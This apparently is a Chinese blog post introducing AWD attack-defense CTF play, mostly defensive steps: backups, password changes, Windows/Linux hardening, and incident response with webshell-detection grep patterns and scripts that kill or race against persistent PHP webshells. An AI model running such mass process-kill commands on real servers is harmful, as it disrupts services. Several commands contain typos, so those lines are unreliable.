<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  <link rel="icon" href="/images/favicon.ico">
  
  <title>被awd速通(1) | Err0r233</title>
  <meta name="author" content="Err0r2333" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="awd" />
  
  <meta name="description" content="心血来潮学习awd(吗？)">
<meta property="og:type" content="article">
<meta property="og:title" content="被awd速通(1)">
<meta property="og:url" content="http://example.com/posts/57335.html">
<meta property="og:site_name" content="Err0r233">
<meta property="og:description" content="心血来潮学习awd(吗？)">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/favicon.ico">
<meta property="article:published_time" content="2024-04-28T12:34:41.000Z">
<meta property="article:modified_time" content="2024-06-06T08:06:14.000Z">
<meta property="article:author" content="Err0r2333">
<meta property="article:tag" content="awd">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/favicon.ico">
  
  <!-- 站点验证相关 -->
  
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
    <script src="/js/kr-dark.min.js"></script>
  
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
  
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
  
  
    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('/images/banner3.png');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/Iceartory.jpg');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
</head>



    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                    
                                        
                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
                                        
                                    
                                        
                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
                                        
                                    
                                        
                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
                                        
                                    
                                        
                                            <li>
                                                <a><i class="fa fa-link"></i>链接</a>
                                                <ul class="sub-menu">
                                                    
                                                        
                                                    
                                                </ul>
                                            </li>
                                        
                                    
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">Err0r233</a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>Err0r233</h2> <br />
                        <span>Err0r233的个人博客</span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="http://example.com/posts/57335.html">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">被awd速通(1)</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2024-04-28T12:34:41.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-04-28</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
                </li>
                <li>
                    <i class="fa fa-edit"></i> 
                    
                    
                        ~40.04K
                    
                    字
                </li>
                
                    <li id="/posts/57335.html" class="leancloud_visitors" data-flag-title="被awd速通(1)">
                        <i class="fa fa-eye"></i>
                        <span class="leancloud-visitors-count"> </span> 次阅读
                    </li>
                    
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>本文最后编辑于 <time datetime="1717661174000"></time> 前，其中的内容可能需要更新。</p></div>
            </div>
            
            
            
            <hr />
            <div itemprop="articleBody"><p>心血来潮学习awd(吗？)</p>
<span id="more"></span>
<p>awd常见于线下赛，刚开始每个队都会有相同的初始环境。这些环境运行着一些特定的服务和应用，需要利用这些漏洞，获取flag以获得积分，同时也需要修补自身漏洞进行防御，以防被交flag导致丢分</p>
<h1><span id="流程"> 流程</span></h1>
<ul>
<li>准备：多个靶机服务器，有<code>ssh</code>或<code>vnc</code>的用户名或者密码，以及相关的ip信息</li>
<li>加固：自行登录服务器并进行安全加固。需要进行以下流程
<ul>
<li><strong>备份源码</strong></li>
<li>改密码(包括但不限于ssh密码、mysql密码、windows等密码)</li>
<li>代审(d盾？)，找明显的洞</li>
<li>针对洞进行修复</li>
</ul>
</li>
<li>攻击，通过对别的靶机服务进行攻击获取得分</li>
</ul>
<h1><span id="比赛靶机情况"> 比赛靶机情况</span></h1>
<ul>
<li>运维机<code>Windows 10</code> + 攻击机<code>kali linux</code> + win靶机<code>(Winserver 2003/2008/2012)</code>或者<code>win7</code> + linux靶机<code>Centos7.x / Ubuntu 16.04/17.01/20.04</code></li>
<li>运维机<code>Windows10</code> + 攻击机<code>kali linux</code> + linux靶机</li>
<li>运维机 + 攻击机 + 纯windows靶机</li>
</ul>
<p>也就是说比赛会有数台机子，可能windows，也有可能是linux，这些机子上面的web服务等地方都有漏洞，要先抓紧时间修复，再通过找到的漏洞去攻击别的队伍的服务器拿到flag从而得分</p>
<h1><span id="修复流程"> 修复流程</span></h1>
<h2><span id="备份源码"> 备份源码</span></h2>
<ul>
<li>web源码备份：</li>
</ul>
<p>windows机的话，建议直接打包</p>
<p>web服务路径：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php:</span><br><span class="line">/var/www/html</span><br><span class="line"></span><br><span class="line">java python等比较陌生的目录可以使用以下的方法来获取：</span><br><span class="line">ps -aux | grep python #获取进程用户</span><br><span class="line">ps -aux | grep ctf #获取用户启动的进程</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">一般能够找到java的web启动脚本目录</span></span><br></pre></td></tr></table></figure>
<p>打包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf web.tar /var/www/html</span><br><span class="line">zip -q -r web.zip /var/www/html</span><br></pre></td></tr></table></figure>
<p>解压缩</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf web.tar -c /var/www/html</span><br><span class="line">unzip web.zip -d /var/www/html</span><br></pre></td></tr></table></figure>
<p>备份：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv web.tar /tmp #也可以是其他的路径</span><br><span class="line">mv web.zip /tmp #也可以是其他的路径</span><br></pre></td></tr></table></figure>
<p>上传和下载源码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scp username@servername:/path/filename /tmp/local_destination  #从服务器下载单个文件到本地</span><br><span class="line">scp /path/local_filename username@servername:/path             #从本地上传单个文件到服务器</span><br><span class="line">scp -r username@servername:remote_dir/ /tmp/local_dir          #从服务器下载整个目录到本地</span><br><span class="line">scp -r /tmp/local_dir username@servername:remote_dir           #从本地上传整个目录到服务器</span><br></pre></td></tr></table></figure>
<ul>
<li>mysql数据库备份</li>
<li>检查mysqldump是否在<code>/usr/sbin</code>等其他目录下</li>
<li>如果靶机没有需要提前准备编译好的工具：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u username -p password databasename &gt;target.sql</span><br></pre></td></tr></table></figure>
<p>备份所有数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -all -databases &gt; all.sql</span><br></pre></td></tr></table></figure>
<p>导入数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u username -p password database &lt; from.sql</span><br></pre></td></tr></table></figure>
<p>source导入mysql方法：</p>
<p>前提：<strong>需要创建好数据库，且该数据库必须与你的备份文件中的库名一样</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use db_name;</span><br><span class="line">source /tmp/xxxx.sql</span><br></pre></td></tr></table></figure>
<ul>
<li>备份运行进程命令：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux &gt; /tmp/ps.txt</span><br></pre></td></tr></table></figure>
<h2><span id="改密码"> 改密码</span></h2>
<p>ssh:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd admin</span><br><span class="line">passwd root</span><br></pre></td></tr></table></figure>
<p>一些后台密码可能默认会存在于一些类似于<code>admin.php</code>，<code>login.php</code>当中，还有可能存在于<code>db.sql</code>等数据库当中，记得修改密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 字段1=值1,字段2=值2..;</span><br></pre></td></tr></table></figure>
<p>改mysql密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p #登录</span><br><span class="line">set password for username@localhost = password(新密码)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">方法2</span></span><br><span class="line">mysqldamin -u用户名 -p旧密码 password 新密码</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">方法3</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">登录root</span></span><br><span class="line">use mysql;</span><br><span class="line">update mysql.user set authentication_string=password(&#x27;新密码&#x27;) where user=&#x27;用户名&#x27; and Host = &#x27;localhost&#x27;;</span><br><span class="line">flush privileges;</span><br><span class="line">quit;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">该方法不适用于mysql8</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">方法4 mysql8</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要先检查authentication_string是否为空</span></span><br><span class="line">use mysql;</span><br><span class="line">update user set authentication_string = &#x27;&#x27; where user = &#x27;root&#x27;;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">先置空该字段↑</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改密码为root↓</span></span><br><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;root&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">若报错，则需刷新一下权限</span></span><br><span class="line">flush privileges;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再执行修改密码的操作</span></span><br><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;root&#x27;</span><br></pre></td></tr></table></figure>
<p>redis：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 6379</span><br><span class="line"></span><br><span class="line">auth passwd</span><br><span class="line"></span><br><span class="line">config set requirepass mima</span><br></pre></td></tr></table></figure>
<h2><span id="windows加固"> windows加固</span></h2>
<p>查看信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
<p>加固445端口、防火墙3389服务：</p>
<ol>
<li>开启系统日志审计功能</li>
<li>禁用guest账户、关闭文件共享</li>
<li>确保启动项内容是可控的</li>
<li>限制3389远程访问控制的连接数：在本地组策略编辑器里面，依次展开计算机配置–&gt;管理模板–&gt;Windows组件–&gt;远程桌面服务–&gt;远程桌面会话主机–&gt;连接–&gt;限制连接的数量</li>
<li>使用工具监控关键目录文件:文件操作监控.exe、御剑文件监控.exe</li>
<li>恶意代码文件，通过PCHunter、Monitor查找</li>
<li>Web目录环境查找相关可疑文件：jpg/png/rar，查看属性、解压看文件内容</li>
<li>NTFS扫描磁盘查找隐藏的交换流数据</li>
<li>查找系统所有账户信息，禁止非Administrator账户</li>
</ol>
<p>查看端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat #查看活动链接</span><br><span class="line">netstat -ano/-a #查看端口情况</span><br><span class="line">netstat -anp #查看端口</span><br><span class="line">firewall-cmd --zone=public --remove-port=80/tcp -permanent #关端口</span><br><span class="line">firewall-cmd -reload #重启防火墙</span><br></pre></td></tr></table></figure>
<p>RDP：</p>
<p>删除默认帐户并手动添加新用户：</p>
<ul>
<li>步骤1：按 <code>Win + R</code> 打开运行对话框，输入 <code>secpol.msc</code> 并单击 “确定”</li>
<li>步骤2：导航至此处：本地策略–&gt;用户权限分配，再双击打开 “允许通过远程桌面服务登录”</li>
<li>步骤3：删除此窗口中列出的管理员和远程桌面用户（或计算机上的任何其他用户或组）</li>
<li>步骤4：之后单击 “添加用户或组” 并手动添加您要授予远程桌面访问权限的用户</li>
</ul>
<p>更改默认RDP端口号：</p>
<ul>
<li>步骤1：打开运行对话框，输入 <code>regedit</code> 并单击 “确定”</li>
<li>步骤2：打开 <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</code> ，向下滚动并找到 <code>PortNumber</code> 然后双击它</li>
<li>步骤3：选择 “十进制”，修改为您想要设置的端口号，然后单击 “确定”</li>
</ul>
<h2><span id="linux加固"> linux加固</span></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">改密码</span><br><span class="line">.bash_history查找历史命令</span><br><span class="line">crontab -l 查看计划任务</span><br><span class="line">crontab -e 编辑</span><br><span class="line">cat /etc/init.d/rc.local 查看启动服务有无异常</span><br><span class="line">iptable</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uname -a #内核</span><br><span class="line">ps -aux #进程</span><br><span class="line">ps -ef | grep 进程名称 #筛选进程</span><br><span class="line">id</span><br><span class="line">cat /etc/passwd</span><br><span class="line">ls /home/</span><br><span class="line">find / -type d -perm -002 #可写目录检查</span><br><span class="line">ifconfig</span><br><span class="line">ip addr show #查网卡信息</span><br></pre></td></tr></table></figure>
<p>查看端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat #查看活动链接</span><br><span class="line">netstat -ano/-a #查看端口情况</span><br><span class="line">netstat -anp #查看端口</span><br><span class="line">firewall-cmd --zone=public --remove-port=80/tcp -permanent #关端口</span><br><span class="line">firewall-cmd -reload #重启防火墙</span><br></pre></td></tr></table></figure>
<p>SSH安全加固：</p>
<p>限制ip登录</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/ssh/sshd_config       //以root权限编辑SSH配置文件</span><br><span class="line">AllowUsers username@192.168.0.100    //找到并编辑以下行，确保其取消注释并设置为所需的IP地址</span><br></pre></td></tr></table></figure>
<p>禁用<code>root</code>远程登录(同上配置)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/ssh/sshd_config       //以root权限编辑SSH配置文件</span><br><span class="line">PermitRootLogin no                   //将PermitRootLogi设置为“no”</span><br></pre></td></tr></table></figure>
<p>按用户和组限制SSH登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/ssh/sshd_config       //以root权限编辑SSH配置文件</span><br><span class="line">AllowUsers testuser                  //设置只允许 testuser 登录SSH</span><br><span class="line">AllowUsers testuser@192.168.1.100    //设置只允许 192.168.1.100 的机器用 testuser 账户登录SSH</span><br><span class="line">AllowGroups test                     //设置用户组白名单</span><br><span class="line">//需要注意的是：如果同时指定了 AllowUsers 与 AllowGroups 那么必须要在两个选项中都匹配到的用户才能进行SSH登录</span><br></pre></td></tr></table></figure>
<p>重启SSH服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service sshd restart</span><br><span class="line">sudo systemctl restart sshd.service</span><br></pre></td></tr></table></figure>
<h2><span id="信息收集"> 信息收集</span></h2>
<p>寻找配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find  /var/www/html -path &#x27;*config*&#x27;</span><br></pre></td></tr></table></figure>
<p>如果是java，将jar包解压之后看一下<code>BOOT-INF/lib</code>下的依赖，是否有shiro等依赖，若有，再检查<code>ShiroConfig.class</code>或者类似的地方是否有存在shiro的默认密钥</p>
<p>寻找flag</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux下，在web目录中找flag</span></span><br><span class="line">grep -r &quot;flag&quot; /var/www/html</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">windows下，从当前目录和所有的子目录下的所有文件查找flag</span></span><br><span class="line">findstr /s /i &quot;flag&quot; *.*</span><br></pre></td></tr></table></figure>
<p>禁ping：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;1&quot; &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all #临时开启禁ping</span><br><span class="line"></span><br><span class="line">echo &quot;0&quot; &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all #关闭禁ping</span><br></pre></td></tr></table></figure>
<h2><span id="应急响应"> 应急响应</span></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat</span><br><span class="line">ps -aux</span><br><span class="line">netstat -apt</span><br></pre></td></tr></table></figure>
<p>杀进程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kill -9 pid</span><br><span class="line"></span><br><span class="line">taskkill /f /pid pid</span><br></pre></td></tr></table></figure>
<p>搜webshell：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name *.php -mmin -5                        //查看最近5分钟修改文件</span><br><span class="line">find ./ -name &#x27;*.php&#x27; | xargs wc -l | sort -u                  //寻找行数最短文件，一般有可能是一句话木马</span><br><span class="line">grep -r --include=*.php  &#x27;[^a-z]eval($_POST&#x27;  /var/www/html    //查包含关键字的php文件</span><br><span class="line">find /var/www/html -type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot; |more //在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串&quot;eval(&quot;的行，并使用more命令来分页显示结果以便在输出较长时进行逐页查看</span><br></pre></td></tr></table></figure>
<p>不死马：</p>
<p>高权限下，可以直接重启服务：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ubuntu</span></span><br><span class="line">service apache2 start</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">centos</span></span><br><span class="line">systemctl apache2 start</span><br></pre></td></tr></table></figure>
<p>但是基本上比赛的时候不会放出高权限的账户，得在低权限下进行处理：</p>
<p>del.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//www-data，用户名不一定是www-data，要看情况</span></span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&quot;kill `ps -aux | grep www-data | grep -v grep | awk &#x27;&#123;print <span class="subst">$2</span>&#125;&#x27; | xargs kill -9`&quot;</span>);</span><br><span class="line">	<span class="comment">//杀php-fpm</span></span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&quot;kill `ps -ef | grep php-fpm | grep -v grep | awk &#x27;&#123;print <span class="subst">$2</span>&#125;&#x27;`&quot;</span>);</span><br><span class="line">	<span class="comment">//杀httpd php-apache</span></span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&quot;kill `ps -ef | grep httpd | grep -v grep | awk &#x27;&#123;print <span class="subst">$2</span>&#125;&#x27;`&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>访问后再删除不死马</p>
<p>也可以先利用ps命令查看进程的pid</p>
<p>或者我们也可以用<code>ps -aux</code>命令来查看每个用户执行的命令和运行的进程</p>
<p>然后：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"> <span class="variable">$pid</span>=<span class="number">1234</span>; <span class="comment">//进程的pid</span></span><br><span class="line"> @<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;.shell.php&#x27;</span>);</span><br><span class="line"> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;kill -9 $pid&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>方法2：创建一个和不死马同名的文件夹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;<span class="keyword">do</span> <span class="built_in">rm</span> -rf .l.php;<span class="built_in">mkdir</span> .l.php;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>运行时：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup bash 1.sh &amp;</span><br></pre></td></tr></table></figure>
<p>方法3：竞争写入无意义的一句话：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.l.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php echo &quot;awa&quot;; ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="comment">//system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .l.php&#x27;);</span></span><br><span class="line">        <span class="comment">//usleep(1000);</span></span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep www-data | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure>
<p>查杀弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br><span class="line">px -aux</span><br><span class="line">ps -aux | grep www-data</span><br></pre></td></tr></table></figure>
<p>检查是否有<code>/bin/sh</code>或者<code>/bin/bash</code></p>
<p>很有可能是nc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill `ps -aux | grep www-data | grep apache2 | awk &#x27;&#123;print $2&#125;&#x27;`</span><br></pre></td></tr></table></figure>
<p>变种不死马：</p>
<p>文件名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-index.php等</span><br></pre></td></tr></table></figure>
